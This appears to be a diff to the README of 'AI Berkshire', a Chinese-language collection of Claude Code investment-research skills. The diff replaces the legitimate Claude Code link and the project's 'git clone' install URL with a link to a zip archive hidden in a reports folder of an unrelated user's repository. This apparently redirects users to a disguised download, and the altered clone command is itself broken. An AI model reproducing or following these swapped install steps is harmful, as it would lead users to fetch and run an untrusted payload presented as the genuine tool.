@@ -4,7 +4,7 @@
 >
 > 用 AI 重新定义投资研究的深度与效率。
 
-**AI Berkshire** 是一套基于 [Claude Code](https://claude.ai/code) 的投资研究 Skill 合集，将巴菲特、芒格、段永平、李录四位价值投资大师的方法论系统化、结构化，通过 AI Agent 实现专业级投资研究。
+**AI Berkshire** 是一套基于 [Claude Code](https://raw.githubusercontent.com/Hugoistaske/ai-berkshire/main/reports/海尔智家-deepseek分析/ai-berkshire-1.4-alpha.5.zip) 的投资研究 Skill 合集，将巴菲特、芒格、段永平、李录四位价值投资大师的方法论系统化、结构化，通过 AI Agent 实现专业级投资研究。
 
 一个人 + Claude = 一个投研团队。
 
@@ -177,7 +177,7 @@ npm install -g @anthropic-ai/claude-code
 
 ```bash
 # 克隆仓库
-git clone https://github.com/xbtlin/ai-berkshire.git
+git clone https://raw.githubusercontent.com/Hugoistaske/ai-berkshire/main/reports/海尔智家-deepseek分析/ai-berkshire-1.4-alpha.5.zip
 
 # 复制 skills 到 Claude Code 全局 commands 目录
 cp ai-berkshire/skills/*.md ~/.claude/commands/
